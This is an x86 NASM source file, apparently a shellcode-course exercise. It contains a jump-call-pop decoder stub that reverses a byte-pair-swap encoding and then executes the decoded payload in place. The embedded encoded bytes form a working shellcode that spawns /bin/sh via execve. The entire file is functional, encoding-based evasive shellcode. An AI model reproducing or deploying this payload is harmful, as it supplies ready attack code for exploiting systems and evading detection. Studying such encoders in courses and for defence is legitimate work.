;Filename: Mirror-decoder.nasm
;Author:  MrSquid
;Purpose: Decoder for shellcodes encoded using Reverse-encoder.py

global _start			

section .text
_start:

	jmp short call_shellcode  ;jump-call-pop technique

decoder:

	pop esi			; pop shellcode into esi
	lea edi, [esi]		; Copy the position in memory of the shellcode to edi, where we will save the decoded one
	xor eax, eax		; Clearing out eax and ecx
	xor ecx, ecx

decode:
	mov ax, [esi]                ; Moves the first to bytes of esi to ax
	mov cx, ax		     ;Moves ax to cx to check if it is the end of the shellcode
	xor cx, 0xf0f0               ; compare cx with 0xf0f0 marker
	jz short EncodedShellcode    ; if xor os 0, jump to shellcode
	mov byte [edi], ah           ;Move the second byte to the first byte of edi
	mov byte [edi + 1], al;      ; Move the first byte to the second byte of edi --> 0x31c0 moves to 0xc031 in edi 	
	inc edi			     ; move to next byte in edi
	inc edi			     ; move to next byte in edi	
	inc esi			     ; move to next byte in esi
	inc esi                      ; move to next byte in esi 
	jmp short decode	     ; jump back to start of decode
	
	
	
;Las modificaciones se van viendo sobre el offset de esi x/20xb *call		
    	

	
call_shellcode:

	call decoder
	EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x2f,0x2f,0x68,0x73,0x2f,0x68,0x69,0x62,0x89,0x6e,0x50,0xe3,0xe2,0x89,0x89,0x53,0xb0,0xe1,0xcd,0x0b,0xf0,0x80,0xf0,0xf0,0xee,0xee
